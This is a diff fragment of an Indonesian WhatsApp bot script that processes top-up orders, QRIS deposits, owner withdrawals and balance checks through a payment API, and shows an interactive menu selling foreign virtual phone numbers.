+                                sycreply('⚠️ *Pembayaran Dibatalkan Otomatis* setelah 5 menit tanpa konfirmasi keberhasilan.');
+                            });
+                    }, 300000);
+
+                    const interval = setInterval(() => {
+                        axios.post(`${config.api.base_url}/api/h2h/deposit/status`, {
+                                id: payId,
+                                api_key: config.api.secret_key,
+                            })
+                            .then(response => {
+                                const data = response.data.data;
+
+                                if (data.status === 'success' || data.status === 'failed') {
+                                    clearInterval(interval);
+                                    clearTimeout(timeout);
+
+                                    delete orderData[senderNumber];
+                                    fs.writeFileSync(tmpFilePath, JSON.stringify(orderData, null, 2));
+
+                                    if (data.status === 'success') {
+                                        performTopupTransaction(reffId, code, target);
+                                        sycreply(`⬣ *Pembayaran Berhasil!*\n\n` +
+                                            `◉ ID Pembayaran: ${data.reff_id}\n` +
+                                            `◉ Status: ${data.status}\n` +
+                                            `◉ Diterima: ${toRupiah(data.get_balance)}\n` +
+                                            `◉ Tanggal: ${data.date}\n\n` +
+                                            `Terimakasih.`);
+                                    } else if (data.status === 'failed' || data.status === 'cancel' || data.status === 'canceled') {
+                                        clearInterval(interval);
+                                        return sycreply('Sangat disayangkan sekali. Pembayaran kamu dibatalkan oleh sistem.');
+                                    }
+                                }
+                            });
+                    }, 5000);
+                }
+
+                function performTopupTransaction(reffId, code, target) {
+                    axios.post(`${config.api.base_url}/api/h2h/transaction/create`, {
+                            reff_id: reffId,
+                            product_code: code.toUpperCase(),
+                            target: target,
+                            api_key: config.api.secret_key,
+                        })
+                        .then(response => {
+                            const data = response.data;
+
+                            if (!data.data) return sycreply(data.message);
+
+                            const text = 'Pembelian sedang di proses...';
+
+                            sych.sendMessage(m.key.remoteJid, {
+                                text
+                            }, {
+                                quoted: fkontak
+                            });
+                            
+
+                            checkTransactionStatus(data.data.id);
+                        })
+                        .catch(error => console.error('Error:', error));
+                }
+
+                function checkTransactionStatus(id) {
+                    const interval = setInterval(() => {
+                        axios.post(`${config.api.base_url}/api/h2h/transaction/status`, {
+                                id: id,
+                                api_key: config.api.secret_key,
+                            })
+                            .then(response => {
+                                const data = response.data.data;
+
+                                if (data.status === 'success') {
+                                    clearInterval(interval);
+
+                                    const text = `⬣ *Pembelian Berhasil!*\n\n` +
+                                        `◉ ID Transaksi: ${data.reff_id}\n` +
+                                        `◉ Status: ${data.status}\n` +
+                                        `◉ Layanan: ${data.name}\n` +
+                                        `◉ Target: ${data.target}\n` +
+                                        `◉ Serial Number: ${data.serial_number}\n` +
+                                        `◉ Tanggal: ${data.date}\n\n` +
+                                        `Terimakasih.`;
+
+                                    sych.sendMessage(m.key.remoteJid, {
+                                        text
+                                    }, {
+                                        quoted: fkontak
+                                    });
+                                     // Simpan ID pesan terkirim untuk penghapusan otomatis
+    global.lastMessageId = msg.key.id; // Simpan ID pesan yang baru saja dikirim
+
+                                } else if (data.status === 'cancel' || data.status === 'canceled') {
+                                    clearInterval(interval);
+                                } else if (data.status === 'failed') {
+                                    clearInterval(interval);
+                                    sycreply('Transaksi gagal. Silakan laporkan masalah ini ke owner bot.');
+                                }
+                            });
+                    }, 5000);
+                }
+                break;
+            }
+
+            case 'order2':
+            case 'topup2': {
+                const params = query.split(',').map(param => param.trim());
+                const [code, ...targets] = params;
+                const target = targets.join('|');
+
+                if (!code || !target) {
+                    return sycreply(`Semua parameter (code, target) diperlukan.\n\n*PETUNJUK PENGGUNAAN*
+
+\`Produk game\`
+- Format order: ${prefix}${command} KODE,ID
+- Contoh: ${prefix}${command} HOK250,1223334782
+
+\`Khusus produk game yang memakai Zone ID/Server\`
+- Format order: ${prefix}${command} KODE,ID|SERVER
+- Contoh: ${prefix}${command} MLW1,628299715|10135
+
+\`Produk lainnya\`
+- Format order: ${prefix}${command} KODE,TUJUAN
+- Contoh: ${prefix}${command} S100,082320667363`);
+                }
+
+                const reffId = generateRandomText(10);
+
+                axios.post(`${config.api.base_url}/api/h2h/price-list/all`, {
+                        api_key: config.api.secret_key,
+                    })
+                    .then(response => {
+                        const data = response.data;
+
+                        if (!data.data) return sycreply(data.message);
+
+                        const produk = data.data.find(item => item.code === code.toUpperCase());
+                        if (!produk) return sycreply('Produk tidak ditemukan.');
+
+                        const profit = (config.api.profit / 100) * produk.price;
+                        const finalPrice = Number(produk.price) + Math.ceil(profit);
+                        const produkDetail = `*Nama Produk:* ${produk.name}\n*Kode Produk:* ${produk.code}`;
+
+                        lakukanDeposit(reffId, produkDetail, finalPrice, code, target);
+                    })
+                    .catch(error => {
+                        sycreply('Transaksi gagal dibuat. Silahkan laporkan masalah ini ke owner bot.');
+                        console.error('Error:', error);
+                    });
+
+                function lakukanDeposit(reffId, product, nominal, code, target) {
+                    axios.post(`${config.api.base_url}/api/h2h/deposit/create`, {
+                            reff_id: reffId,
+                            type: 'ewallet',
+                            method: 'QRISFAST',
+                            nominal: nominal,
+                            api_key: config.api.secret_key,
+                        })
+                        .then(response => {
+                            const data = response.data;
+
+                            if (!data.data) return sycreply(data.message);
+
+                            const text = `*TRANSAKSI BERHASIL DIBUAT*\n\n*Kode Pembayaran:* ${data.data.reff_id}\n*Nominal:* Rp ${toRupiah(data.data.nominal)}\n${product}\n*Dibuat Pada:* ${data.data.created_at}\n\n*Note:* Pembayaran akan otomatis dibatalkan 5 menit lagi!\n\n\`Bot ini telah terintegrasi dengan API yang disediakan oleh ${config.api.base_url}\``;
+
+                            sych.sendMessage(m.key.remoteJid, {
+                                    image: {
+                                        url: data.data.qr_image_url
+                                    },
+                                    caption: text,
+                                }, {
+                                    quoted: fkontak
+                                })
+                                .then(sentMessage => {
+                                    const messageId = sentMessage.key.id;
+
+                                    checkPaymentStatus(data.data.id, messageId, reffId, code, target);
+
+                                    setTimeout(() => {
+                                        sych.sendMessage(m.key.remoteJid, {
+                                            delete: {
+                                                remoteJid: jid,
+                                                fromMe: true,
+                                                id: messageId
+                                            },
+                                        });
+                                    }, 300000);
+                                });
+                        })
+                        .catch(error => console.error('Error:', error));
+                }
+
+                function checkPaymentStatus(payId, messageId, reffId, code, target) {
+                    const interval = setInterval(() => {
+                        axios.post(`${config.api.base_url}/api/h2h/deposit/status`, {
+                                id: payId,
+                                api_key: config.api.secret_key,
+                            })
+                            .then(response => {
+                                const data = response.data.data;
+
+                                if (data.status === 'success') {
+                                    clearInterval(interval);
+                                    clearTimeout(timeout);
+
+                                    lakukanTransaksiTopup(reffId, code, target);
+
+                                    sycreply(`⬣ *Pembayaran Berhasil!*\n\n` +
+                                        `◉ ID Pembayaran: ${data.reff_id}\n` +
+                                        `◉ Status: ${data.status}\n` +
+                                        `◉ Diterima: ${toRupiah(data.get_balance)}\n` +
+                                        `◉ Tanggal: ${data.date}\n\n` +
+                                        `Terimakasih.`);
+
+                                    sych.sendMessage(m.key.remoteJid, {
+                                        delete: {
+                                            remoteJid: jid,
+                                            fromMe: true,
+                                            id: messageId
+                                        },
+                                    });
+                                } else if (data.status === 'cancel' || data.status === 'canceled') {
+                                    clearInterval(interval);
+                                } else if (data.status === 'failed') {
+                                    clearInterval(interval);
+                                    sycreply('Transaksi gagal. Silakan laporkan masalah ini ke owner bot.');
+                                }
+                            });
+                    }, 5000);
+
+                    const timeout = setTimeout(() => {
+                        clearInterval(interval);
+
+                        axios.post(`${config.api.base_url}/api/h2h/deposit/cancel`, {
+                                id: payId,
+                                api_key: config.api.secret_key,
+                            })
+                            .then(response => {
+                                const data = response.data;
+
+                                if (!data.data) return sycreply(data.message);
+
+                                sycreply(`⚠️ *Pembayaran Dibatalkan Otomatis* setelah 5 menit tanpa konfirmasi keberhasilan.`);
+                            });
+                    }, 300000);
+                }
+
+                function lakukanTransaksiTopup(reffId, code, target) {
+                    axios.post(`${config.api.base_url}/api/h2h/transaction/create`, {
+                            reff_id: reffId,
+                            product_code: code.toUpperCase(),
+                            target: target,
+                            api_key: config.api.secret_key,
+                        })
+                        .then(response => {
+                            const data = response.data;
+
+                            if (!data.data) return sycreply(data.message);
+
+                            const text = 'Pembelian sedang di proses...';
+
+                            sych.sendMessage(m.key.remoteJid, {
+                                text
+                            }, {
+                                quoted: fkontak
+                            });
+
+                            checkTransaksiStatus(data.data.id);
+                        })
+                        .catch(error => console.error('Error:', error));
+                }
+
+                function checkTransaksiStatus(id) {
+                    const interval = setInterval(() => {
+                        axios.post(`${config.api.base_url}/api/h2h/transaction/status`, {
+                                id: id,
+                                api_key: config.api.secret_key,
+                            })
+                            .then(response => {
+                                const data = response.data.data;
+
+                                if (data.status === 'success') {
+                                    clearInterval(interval);
+
+                                    const text = `⬣ *Pembelian Berhasil!*\n\n` +
+                                        `◉ ID Transaksi: ${data.reff_id}\n` +
+                                        `◉ Status: ${data.status}\n` +
+                                        `◉ Layanan: ${data.name}\n` +
+                                        `◉ Target: ${data.target}\n` +
+                                        `◉ Serial Number: ${data.serial_number}\n` +
+                                        `◉ Tanggal: ${data.date}\n\n` +
+                                        `Terimakasih.`;
+
+                                    sych.sendMessage(m.key.remoteJid, {
+                                        text
+                                    }, {
+                                        quoted: fkontak
+                                    });
+                                } else if (data.status === 'cancel' || data.status === 'canceled') {
+                                    clearInterval(interval);
+                                } else if (data.status === 'failed') {
+                                    clearInterval(interval);
+                                    sycreply('Transaksi gagal. Silakan laporkan masalah ini ke owner bot.');
+                                }
+                            });
+                    }, 5000);
+                }
+                break;
+            }
+
+            case 'cancel': {
+                if (global.lastMessageId) {
+        await sych.deleteMessage(m.chat, { id: global.lastMessageId }); // Menghapus pesan sebelumnya
+    }
+    const params = query.split(',').map(param => param.trim());
+    const [reffId] = params;
+
+    if (!reffId) {
+        return sycreply('Parameter `reffId` diperlukan untuk membatalkan deposit.\n\n*PETUNJUK PENGGUNAAN*\n\n' +
+            `\`Format: ${prefix}${command} REFFID\`\n` +
+            `\`Contoh: ${prefix}${command} ABC123456\``);
+    }
+               const senderNumber = m.sender.split('@')[0];
+    const tmpFilePath = path.join(__dirname, 'tmp', 'orders.json');
+
+    let orderData = {};
+    if (fs.existsSync(tmpFilePath) && fs.statSync(tmpFilePath).size > 0) {
+        orderData = JSON.parse(fs.readFileSync(tmpFilePath, 'utf8'));
+    } else {
+        return sycreply('Data transaksi tidak ditemukan.');
+    }
+
+    console.log('Order Data:', JSON.stringify(orderData, null, 2)); // Debugging
+
+    if (!orderData[senderNumber]) {
+        return sycreply('Tidak ada transaksi yang terkait dengan nomor pengirim ini.');
+    }
+
+    if (orderData[senderNumber].reffId !== reffId) {
+        return sycreply('Tidak ada transaksi yang terkait dengan kode pembayaran ini.');
+    }
+
+    const payId = orderData[senderNumber].payId;
+
+    axios.post(`${config.api.base_url}/api/h2h/deposit/cancel`, {
+            id: payId,
+            api_key: config.api.secret_key,
+        })
+        
+        .then(() => {
+            delete orderData[senderNumber];
+
+            fs.writeFileSync(tmpFilePath, JSON.stringify(orderData, null, 2));
+
+            sycreply(`⚠️ Pembayaran dengan reffId ${reffId} dan payId ${payId} telah dibatalkan.`);
+        })
+        .catch(error => {
+            console.error('Error:', error);
+            sycreply('Gagal membatalkan deposit. Silakan coba lagi atau laporkan masalah ini ke owner bot.');
+        });
+
+    break;
+}
+
+            case 'buy': {
+                if (!isCreator) return sycreply('❌ Kamu tidak memiliki izin untuk menggunakan fitur ini.');
+
+                const params = query.split(',').map(param => param.trim());
+                const [code, ...targets] = params;
+                const target = targets.join(',');
+
+                if (!code || !target) {
+                    return sycreply(`Semua parameter (code, target) diperlukan.\n\nContoh: ${prefix}${command} ML3,628299715|10135`);
+                };
+
+                const reffId = generateRandomText(10);
+
+                try {
+                    const response = await axios.post(`${config.api.base_url}/api/h2h/transaction/create`, {
+                        reff_id: reffId,
+                        product_code: code.toUpperCase(),
+                        target: target,
+                        api_key: config.api.secret_key
+                    });
+
+                    const data = response.data;
+
+                    if (!data.data) return sycreply(data.message);
+
+                    const text = `Pembelian sedang di prosess:\n\nLayanan: ${data.data.name}\nTarget: ${data.data.target}\nReff id: ${data.data.reff_id}\nNominal: Rp ${toRupiah(data.data.price)}\nSN: ${data.data.serial_number}\nDibuat pada: ${data.data.date}`;
+                    sych.sendMessage(m.key.remoteJid, {
+                        text: text
+                    }, {
+                        quoted: fkontak
+                    }).then(sentMessage => {
+                        checkTransactionStatus(data.data.id, sentMessage.key.id);
+
+                        setTimeout(() => {
+                            sych.sendMessage(m.key.remoteJid, {
+                                delete: {
+                                    remoteJid: jid,
+                                    fromMe: true,
+                                    id: sentMessage.key.id
+                                }
+                            });
+                        }, 300000);
+                    });
+                } catch (error) {
+                    console.error('Error fetching data:', error);
+                    sycreply('Saldo tidak cukup!');
+                }
+
+                async function checkTransactionStatus(id, messageId) {
+                    const interval = setInterval(async () => {
+                        const response = await axios.post(`${config.api.base_url}/api/h2h/transaction/status`, {
+                            id: id,
+                            api_key: config.api.secret_key
+                        });
+
+                        const data = response.data;
+
+                        if (data.data.status === 'success') {
+                            clearInterval(interval);
+                            clearTimeout(timeout);
+                            sycreply(`⬣ *Pembelian Berhasil!*\n\n` +
+                                `◉ ID Pembayaran: ${data.data.reff_id}\n` +
+                                `◉ Status: ${data.data.status}\n` +
+                                `◉ Layanan: ${data.data.name}\n` +
+                                `◉ Target: ${data.data.target}\n` +
+                                `◉ Serial Number: ${data.data.serial_number}\n` +
+                                `◉ Tanggal: ${data.data.date}\n\n` +
+                                `Terimakasih.`);
+                            sych.sendMessage(m.key.remoteJid, {
+                                delete: {
+                                    remoteJid: jid,
+                                    fromMe: true,
+                                    id: messageId
+                                }
+                            });
+                        } else if (data.data.status === 'failed') {
+                            clearInterval(interval);
+                            sycreply(`Sangat Disayangkan Sekali. Pembayaran Kamu Dibatalkan Oleh Sistem.`);
+                        }
+                    }, 5000);
+
+                }
+
+                break;
+            }
+
+            // Deposit
+            case 'deposit':
+            case 'depo': {
+                if (!isCreator) return sycreply('❌ Kamu tidak memiliki izin untuk menggunakan fitur ini.');
+
+                if (!query) return sycreply(`Example: ${prefix}${command} 500.`);
+                const nominal = query;
+                if (nominal < 500) return sycreply('Jumlah minimal: 500.');
+
+                const reffId = generateRandomText(10);
+
+                try {
+                    const response = await axios.post(`${config.api.base_url}/api/h2h/deposit/create`, {
+                        reff_id: reffId,
+                        type: 'ewallet',
+                        method: 'QRISFAST',
+                        nominal: nominal,
+                        api_key: config.api.secret_key
+                    });
+
+                    const data = response.data;
+
+                    if (!data.data) return sycreply(data.message);
+
+                    const text = `Reff id: ${data.data.reff_id}\nNominal: Rp ${toRupiah(data.data.nominal)}\nFee: Rp ${toRupiah(data.data.fee)}\nDiterima: Rp ${toRupiah(data.data.get_balance)}\nDibuat pada: ${data.data.created_at}\n\nNote: Pembayaran akan otomatis dibatalkan 5 menit lagi!`;
+                    sych.sendMessage(m.key.remoteJid, {
+                        image: {
+                            url: data.data.qr_image_url
+                        },
+                        caption: text
+                    }, {
+                        quoted: fkontak
+                    }).then(sentMessage => {
+                        checkPaymentStatus(data.data.id, sentMessage.key.id);
+
+                        setTimeout(() => {
+                            sych.sendMessage(m.key.remoteJid, {
+                                delete: {
+                                    remoteJid: jid,
+                                    fromMe: true,
+                                    id: sentMessage.key.id
+                                }
+                            });
+                        }, 300000);
+                    });
+
+                    async function checkPaymentStatus(id, messageId) {
+                        const interval = setInterval(async () => {
+                            const response = await axios.post(`${config.api.base_url}/api/h2h/deposit/status`, {
+                                id: id,
+                                api_key: config.api.secret_key
+                            });
+
+                            const data = response.data;
+
+                            if (data.data.status === 'success') {
+                                clearInterval(interval);
+                                clearTimeout(timeout);
+                                sycreply(`⬣ *Pembayaran Berhasil!*\n\n` +
+                                    `◉ ID Pembayaran: ${data.data.reff_id}\n` +
+                                    `◉ Status: ${data.data.status}\n` +
+                                    `◉ Diterima: ${toRupiah(data.data.get_balance)}\n` +
+                                    `◉ Tanggal: ${data.data.date}\n\n` +
+                                    `Terimakasih.`);
+                                sych.sendMessage(m.key.remoteJid, {
+                                    delete: {
+                                        remoteJid: jid,
+                                        fromMe: true,
+                                        id: messageId
+                                    }
+                                });
+                            } else if (data.data.status === 'failed') {
+                                clearInterval(interval);
+                                sycreply(`Sangat Disayangkan Sekali. Pembayaran Kamu Dibatalkan Oleh Sistem.`);
+                            }
+                        }, 5000);
+
+                        const timeout = setTimeout(async () => {
+                            clearInterval(interval);
+                            const response = await axios.post(`${config.api.base_url}/api/h2h/deposit/cancel`, {
+                                id: id,
+                                api_key: config.api.secret_key
+                            });
+
+                            const data = response.data;
+
+                            if (!data.data) return sycreply(data.message);
+                            sycreply(`⚠️ *Pembayaran Dibatalkan Otomatis* setelah 5 menit tanpa konfirmasi keberhasilan.`);
+                        }, 300000);
+                    }
+                } catch (error) {
+                    console.error('Error fetching data:', error);
+                    sycreply('Terjadi kesalahan, silahkan coba lagi nanti.');
+                }
+                break;
+            }
+
+            // Transfer
+            case 'transfer':
+            case 'wd_balance':
+            case 'wd': {
+                if (!isCreator) return sycreply('❌ Kamu tidak memiliki izin untuk menggunakan fitur ini.');
+
+                if (!query) return sycreply(`Example: ${prefix}${command} 3000.`);
+                const nominal = query;
+                if (nominal < 3000) return sycreply('Jumlah minimal: 3000.');
+
+                const reffId = generateRandomText(10);
+
+                try {
+                    const response = await axios.post(`${config.api.base_url}/api/h2h/transfer/create`, {
+                        reff_id: reffId,
+                        bank_code: 'DANA',
+                        account_number: config.api.dana.number,
+                        owner_name: config.api.dana.name,
+                        email_address: config.api.dana.email,
+                        phone_number: config.api.dana.number,
+                        note: 'Withdraw Saldo',
+                        nominal: nominal,
+                        api_key: config.api.secret_key
+                    });
+
+                    const data = response.data;
+
+                    console.log(data.message);
+
+                    if (!data.data) return sycreply(data.message);
+
+                    const text = `Reff id: ${data.data.reff_id}\nNama: ${data.data.name}\nNo DANA: ${data.data.number}\nNominal: Rp ${toRupiah(data.data.nominal)}\nFee: Rp ${toRupiah(data.data.fee)}\nTotal: Rp ${toRupiah(data.data.total)}\nDibuat pada: ${data.data.date}`;
+                    sych.sendMessage(m.key.remoteJid, {
+                        text: text
+                    }, {
+                        quoted: fkontak
+                    }).then(sentMessage => {
+                        checkPaymentStatus(data.data.id, sentMessage.key.id);
+
+                    });
+
+                    async function checkPaymentStatus(id, messageId) {
+                        const interval = setInterval(async () => {
+                            const response = await axios.post(`${config.api.base_url}/api/h2h/transfer/status`, {
+                                id: id,
+                                api_key: config.api.secret_key
+                            });
+
+                            const data = response.data;
+
+                            if (data.data.status == 'success') {
+                                clearInterval(interval);
+                                sycreply('Berhasil melakukan transfer.');
+                            } else if (data.data.status == 'failed') {
+                                clearInterval(interval);
+                                sycreply('Gagal melakukan transfer.');
+                            }
+                        }, 5000);
+
+                    }
+                } catch (error) {
+                    console.error('Error fetching data:', error);
+                    sycreply('Saldo tidak cukup!');
+                }
+                break;
+            }
+
+            // Profile
+            case 'check_balance':
+            case 'cek_saldo': {
+                if (!isCreator) return sycreply('❌ Kamu tidak memiliki izin untuk menggunakan fitur ini.');
+
+                const response = await axios.post(`${config.api.base_url}/api/h2h/get-profile/balance`, {
+                    api_key: config.api.secret_key
+                });
+
+                const data = response.data;
+                sycreply(`Jumlah saldo anda: Rp ${toRupiah(data.data.balance)}`);
+                break;
+            }
+
+            /* End Features area */
+
+            /*default: {
+                sycreply('Perintah tidak dikenali. Gunakan .menu untuk melihat daftar perintah.');
+            }*/
+        
+
+
+// Case produk
+case 'pproduk': {
+  if (!isRegistered) {
+      return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');}
+    console.log("Case 'produk' dijalankan."); // Debugging
+
+    // Data produk
+    const products = [
+        { title: "Nomor USA", id: "produk_usa", description: "Harga: Rp 20.000 - Tersedia" },
+        { title: "Nomor UK", id: "produk_uk", description: "Harga: Rp 25.000 - Tersedia" },
+        { title: "Nomor Kanada", id: "produk_canada", description: "Harga: Rp 22.000 - Tersedia" },
+        { title: "Nomor Jerman", id: "produk_germany", description: "Harga: Rp 30.000 - Tersedia" },
+        { title: "Nomor Jepang", id: "produk_japan", description: "Harga: Rp 35.000 - Tersedia" }
+    ];
+
+    // Pesan instruksi
+    let instructionText = "Halo " + " Berikut List Menu Kami\n\n⣿⣿⣷⡁⢆⠈⠕⢕⢂⢕⢂⢕⢂⢔⢂⢕⢄⠂⣂⠂⠆⢂⢕⢂⢕⢂⢕⢂⢕⢂\n⣿⣿⣿⡷⠊⡢⡹⣦⡑⢂⢕⢂⢕⢂⢕⢂⠕⠔⠌⠝⠛⠶⠶⢶⣦⣄⢂⢕⢂⢕\n⣿⣿⠏⣠⣾⣦⡐⢌⢿⣷⣦⣅⡑⠕⠡⠐⢿⠿⣛⠟⠛⠛⠛⠛⠡⢷⡈⢂⢕⢂\n⠟⣡⣾⣿⣿⣿⣿⣦⣑⠝⢿⣿⣿⣿⣿⣿⡵⢁⣤⣶⣶⣿⢿⢿⢿⡟⢻⣤⢑⢂\n⣾⣿⣿⡿⢟⣛⣻⣿⣿⣿⣦⣬⣙⣻⣿⣿⣷⣿⣿⢟⢝⢕⢕⢕⢕⢽⣿⣿⣷⣔\n⣿⣿⠵⠚⠉⢀⣀⣀⣈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣗⢕⢕⢕⢕⢕⢕⣽⣿⣿⣿⣿\n⢷⣂⣠⣴⣾⡿⡿⡻⡻⣿⣿⣴⣿⣿⣿⣿⣿⣿⣷⣵⣵⣵⣷⣿⣿⣿⣿⣿⣿⡿\n⢌⠻⣿⡿⡫⡪⡪⡪⡪⣺⣿⣿⣿⣿⣿⠿⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃\n⠣⡁⠹⡪⡪⡪⡪⣪⣾⣿⣿⣿⣿⠋⠐⢉⢍⢄⢌⠻⣿⣿⣿⣿⣿⣿⣿⣿⠏⠈\n⡣⡘⢄⠙⣾⣾⣾⣿⣿⣿⣿⣿⣿⡀⢐⢕⢕⢕⢕⢕⡘⣿⣿⣿⣿⣿⣿⠏⠠⠈\n⠌⢊⢂⢣⠹⣿⣿⣿⣿⣿⣿⣿⣿⣧⢐⢕⢕⢕⢕⢕⢅⣿⣿⣿⣿⡿⢋⢜⠠⠈\n⠄⠁⠕⢝⡢⠈⠻⣿⣿⣿⣿⣿⣿⣿⣷⣕⣑⣑⣑⣵⣿⣿⣿⡿⢋⢔⢕⣿⠠⠈\n⠨⡂⡀⢑⢕⡅⠂⠄⠉⠛⠻⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢋⢔⢕⢕⣿⣿⠠⠈\n⠄⠪⣂⠁⢕⠆⠄⠂⠄⠁⡀⠂⡀⠄⢈⠉⢍⢛⢛⢛⢋⢔⢕⢕⢕⣽⣿⣿⠠⠈\n\n";
+
+    // Tombol interaktif
+    let buttons = [
+        {
+            name: "single_select",
+            buttonParamsJson: JSON.stringify({
+                title: "Pilih Produk",
+                sections: [
+                    {
+                        title: "Nomor Kosong",
+                        rows: products.map(product => ({
+                            title: product.title,
+                            id: product.id, // Menggunakan ID produk langsung
+                            description: product.description
+                        }))
+                    }
+                ]
+            })
+        }
+    ];
+
+    // Membuat pesan interaktif untuk produk
+    try {
+        const msg = generateWAMessageFromContent(
+            m.chat,
+            {
+                viewOnceMessage: {
+                    message: {
+                        messageContextInfo: {
+                            deviceListMetadata: {},
+                            deviceListMetadataVersion: 2
+                        },
+                        interactiveMessage: proto.Message.InteractiveMessage.create({
+                            body: proto.Message.InteractiveMessage.Body.create({
+                                text: instructionText
+                            }),
+                            footer: proto.Message.InteractiveMessage.Footer.create({
+                                text: botname
+                            }),
+                            header: proto.Message.InteractiveMessage.Header.create({
+                                title: 'Produk Nomor Kosong',
+                                subtitle: 'Pilih produk nomor kosong',
+                            }),
+                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
+                                buttons: buttons
+                            })
+                        })
+                    }
+                }
+            },
+            { quoted: fkontak }
+        );
+
+        console.log("Pesan berhasil dibuat:", msg); // Debugging
+        await sych.relayMessage(m.key.remoteJid, msg.message, { messageId: msg.key.id });
+        console.log("Pesan berhasil dikirim."); // Debugging
+    } catch (error) {
+        console.error("Terjadi kesalahan:", error); // Debugging jika error terjadi
+    }
+}
+break;
+
+case 'produk_usa': {
+    console.log("Produk USA dipilih."); // Debugging
+
+    // Data produk USA
+    let button = [
+        {
+            name: "single_select",
+            buttonParamsJson: JSON.stringify({
+                title: "Melanjutkan Pembayaran",
+                sections: [
+                    {
+                        title: "Pilih Metode Pembayaran",
+                        rows: [
+                            { title: "Transfer Bank", id: "transfer_bank", description: "Transfer melalui bank" },
+                            { title: "E-Wallet", id: "ewallet", description: "Pembayaran menggunakan e-wallet" }
+                        ]
+                    }
+                ]
+            })
+        }
+    ];
+
+    const paymentText = `🛒 *Pembayaran untuk Produk*\n\n` +
+        `- Produk: Nomor USA\n` +
+        `- Harga: Rp 20.000\n\n` +
+        `👉 Pilih metode pembayaran untuk melanjutkan transaksi.`;
+
+    try {
+        const msg = generateWAMessageFromContent(
+            m.chat,
+            {
+                viewOnceMessage: {
+                    message: {
+                        messageContextInfo: {
+                            deviceListMetadata: {},
+                            deviceListMetadataVersion: 2
+                        },
+                        interactiveMessage: proto.Message.InteractiveMessage.create({
+                            body: proto.Message.InteractiveMessage.Body.create({
+                                text: paymentText
+                            }),
+                            footer: proto.Message.InteractiveMessage.Footer.create({
+                                text: botname
+                            }),
+                            header: proto.Message.InteractiveMessage.Header.create({
+                                title: 'Pembayaran Produk USA',
+                                subtitle: 'Melanjutkan Pembayaran',
+                            }),
+                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
+                                buttons: button
+                            })
+                        })
+                    }
+                }
+            },
+            { quoted: fkontak }
+        );
+
+        console.log("Pesan berhasil dibuat:", msg); // Debugging
+        await sych.relayMessage(m.key.remoteJid, msg.message, { messageId: msg.key.id });
+        console.log("Pesan berhasil dikirim."); // Debugging
+    } catch (error) {
+        console.error("Terjadi kesalahan:", error); // Debugging jika error terjadi
+    }
+}
+break;
+
+case 'produk_uk': {
+    console.log("Produk UK dipilih."); // Debugging
+
+    // Data produk UK
+    let button = [
+        {
+            name: "single_select",
+            buttonParamsJson: JSON.stringify({
+                title: "Melanjutkan Pembayaran",
+                sections: [
+                    {
+                        title: "Pilih Metode Pembayaran",
+                        rows: [
+                            { title: "Transfer Bank", id: "transfer_bank", description: "Transfer melalui bank" },
+                            { title: "E-Wallet", id: "ewallet", description: "Pembayaran menggunakan e-wallet" }
+                        ]
+                    }
+                ]
+            })
+        }
+    ];
+
+    const paymentText = `🛒 *Pembayaran untuk Produk*\n\n` +
+        `- Produk: Nomor UK\n` +
+        `- Harga: Rp 25.000\n\n` +
+        `👉 Pilih metode pembayaran untuk melanjutkan transaksi.`;
+
+    try {
+        const msg = generateWAMessageFromContent(
+            m.chat,
+            {
+                viewOnceMessage: {
+                    message: {
+                        messageContextInfo: {
+                            deviceListMetadata: {},
+                            deviceListMetadataVersion: 2
+                        },
+                        interactiveMessage: proto.Message.InteractiveMessage.create({
+                            body: proto.Message.InteractiveMessage.Body.create({
+                                text: paymentText
+                            }),
+                            footer: proto.Message.InteractiveMessage.Footer.create({
+                                text: botname
+                            }),
+                            header: proto.Message.InteractiveMessage.Header.create({
+                                title: 'Pembayaran Produk UK',
+                                subtitle: 'Melanjutkan Pembayaran',
+                            }),
+                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
+                                buttons: button
+                            })
+                        })
+                    }
+                }
+            },
+            { quoted: fkontak }
+        );
+
+        console.log("Pesan berhasil dibuat:", msg); // Debugging
+        await sych.relayMessage(m.key.remoteJid, msg.message, { messageId: msg.key.id });
+        console.log("Pesan berhasil dikirim."); // Debugging
+    } catch (error) {
+        console.error("Terjadi kesalahan:", error); // Debugging jika error terjadi
+    }
+}
+break;
+
+case 'produk_canada': {
+    console.log("Produk Kanada dipilih."); // Debugging
+
+    // Data produk Kanada
+    let button = [
+        {
+            name: "single_select",
+            buttonParamsJson: JSON.stringify({
+                title: "Melanjutkan Pembayaran",
+                sections: [
+                    {
+                        title: "Pilih Metode Pembayaran",
+                        rows: [
+                            { title: "Transfer Bank", id: "transfer_bank", description: "Transfer melalui bank" },
+                            { title: "E-Wallet", id: "ewallet", description: "Pembayaran menggunakan e-wallet" }
+                        ]
+                    }
+                ]
+            })
+        }
+    ];
+
+    const paymentText = `🛒 *Pembayaran untuk Produk*\n\n` +
+        `- Produk: Nomor Kanada\n` +
+        `- Harga: Rp 22.000\n\n` +
+        `👉 Pilih metode pembayaran untuk melanjutkan transaksi.`;
+
+    try {
+        const msg = generateWAMessageFromContent(
+            m.chat,
+            {
+                viewOnceMessage: {
+                    message: {
+                        messageContextInfo: {
+                            deviceListMetadata: {},
+                            deviceListMetadataVersion: 2
+                        },
+                        interactiveMessage: proto.Message.InteractiveMessage.create({
+                            body: proto.Message.InteractiveMessage.Body.create({
+                                text: paymentText
+                            }),
+                            footer: proto.Message.InteractiveMessage.Footer.create({
+                                text: botname
+                            }),
+                            header: proto.Message.InteractiveMessage.Header.create({
+                                title: 'Pembayaran Produk Kanada',
+                                subtitle: 'Melanjutkan Pembayaran',
+                            }),
+                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
+                                buttons: button
+                            })
+                        })
+                    }
+                }
+            },
+            { quoted: fkontak }
+        );
+
+        console.log("Pesan berhasil dibuat:", msg); // Debugging
+        await sych.relayMessage(m.key.remoteJid, msg.message, { messageId: msg.key.id });
+        console.log("Pesan berhasil dikirim."); // Debugging
+    } catch (error) {
+        console.error("Terjadi kesalahan:", error); // Debugging jika error terjadi
+    }
+}
+break;
+
+case 'produk_germany': {
+    console.log("Produk Jerman dipilih."); // Debugging
+
+    // Data produk Jerman
+    let button = [
+        {
+            name: "single_select",
